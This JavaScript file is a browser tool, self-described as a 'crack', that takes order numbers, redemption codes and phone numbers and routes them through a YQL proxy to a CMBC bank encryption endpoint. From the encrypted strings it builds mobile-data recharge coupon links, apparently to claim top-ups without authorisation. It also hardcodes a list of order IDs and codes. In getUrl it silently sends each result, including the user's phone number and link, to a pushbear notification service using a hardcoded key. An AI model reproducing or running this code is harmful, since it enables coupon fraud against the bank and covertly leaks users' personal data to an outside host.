var bannedKeys = ["aXJzdHRlc3Q="];
var myList = [];
var usedList = [];
var preset = [
    "EO2017090603036592915@e9eefa2579b7@",
    "EO2017071203035510890@396fd181e9da@",
    "EO2017090603036588157@01dea13f4da8@",
    "EO2017090603036589391@aa2dd60e0b27@",
    "EO2017083003036466070@ce686a58a5a6@",
    "EO2017090603036596794@bd9eb3fce660@",
    "EO2017090603036590490@d4fd24ec402d@",
    "EO2017090603036595244@045943bb67ff@" // 20170908 22:33
]
var showIn = function(){
  $("#in").append("<input type=text class=form-control id=orderId placeholder=订单号> <input type=text class=form-control id=mobile placeholder=手机号><input type=text class=form-control id=code placeholder=兑换码><textarea id=preset class=form-control placeholder='预设订单和兑换码，以便快速获取地址。格式为 订单号@兑换码@手机号 如 EO2017082303123456789@abcdefg@13588888888 一行一条数据' style='height:200px'></textarea><textarea id=result class=form-control placeholder='破解结果(更新日期2017-08-31-23:42)' style='height:200px'></textarea>");
  $("#yql").attr("onclick", "getEnc()");
  localStorage.preset = removeUsed(preset).join("\r\n");
  $("#preset").val(localStorage.preset);
}

var removeUsed = function(){
 var result = [];
 usedList.forEach(function(code){
  if(preset.indexOf(code) == -1){
   result.push(code);
  }
 });
 return result;
}

var check = function() {
  if (bannedKeys.indexOf(uk) === -1) {
    if(!localStorage.used){
     localStorage.used = usedList;
    }else{
     usedList = localStorage.used.split(",");
    }
    return true;
  }else{
    alert("请用新版~");
    return false;
  }
}

var readLine = function(){
  var text = $("#preset").val();
  localStorage.preset = text;
  if(text.length > 0){
    var lines = text.split("\n");
    var pre = lines.pop().trim();
    $("#preset").val(lines.join("\n"));
    localStorage.preset = $("#preset").val();
    return pre.indexOf("@") > -1 ? pre.split("@") : [];
  }else{
    return [];
  }
}

var getEnc = function(retry){
  var valid = check();
  if(valid){
    $("#yql").text("正在获取...");
    $("#yql").attr("disabled", "disabled");
    if(!retry){
     var pre = readLine();
     if(pre.length === 3){
      $("#orderId").val(pre[0].trim()); 
      $("#code").val(pre[1].trim());
      $("#mobile").val(pre[2].trim()); 
     }
    }
    var mobile = $("#mobile").val().trim();
    var orderId = $("#orderId").val().trim();
    if(mobile && orderId){
      var u = 'https://prefacty.creditcard.cmbc.com.cn/mmc-main-webapp/main/TDESEncryptByCMBCC.json?paramMap={"orderId":"'+orderId+'","mobile":"'+mobile+'"}';
      $.ajax({
          url: "https://query.yahooapis.com/v1/public/yql",
          dataType: "json",
          timeout: 10000,
          data: {
              format: "json",
              q: $("#yql").data("ql") + encodeURI(u) + $("#yql").data("qr")
          },
          success: getUrl,
          error: function(c, u) {
              alert("错误 如果多次尝试无果请联系开发者");
              $("#yql").removeAttr("disabled");
          }
      });
    }else{
      alert("缺少数据");
      $("#yql").removeAttr("disabled"); 
    }
  }
}

var getUrl = function(data){
  $("#yql").removeAttr("disabled");
  if(data.query){
    var re = data.query.results;
    if(re){
      var str = re.reply.enStr;
      var mobile = $("#mobile").val().trim();;
      var code = $("#code").val().trim();;
      var orderId = $("#orderId").val().trim();;
      usedList.push(orderId + "@" + code + "@");
      localStorage.used = usedList;
      var u = "http://ms.lefone.cn/msflowday/couponShowController/showCoupon.do?enStr=" + encodeURIComponent(str);
      var result = "订单：" + orderId + " 码：" + code + " 手机号：" + mobile + " 充值链接：" + u;
      var extra = " 2款" + orderId;
      if(myList.indexOf(orderId) > -1){
        extra = " 14款" + orderId;
      }
      $.get("https://pushbear.ftqq.com/sub?sendkey=751-9616f3ff7deb3cdfda6f4f547ab5b153&text=流量充值"+extra+"&desp=" + result)
      $("#result").val(result);
      $("#yql").text("成功 点击继续获取");
      $("#mobile").val("");
      $("#code").val("");
      $("#orderId").val("");
    }else{
     setTimeout(function(){
      getEnc(true);
     }, 5000)
    }
  }else{
    alert("错误 如果多次尝试无果请联系开发者");
  }
}
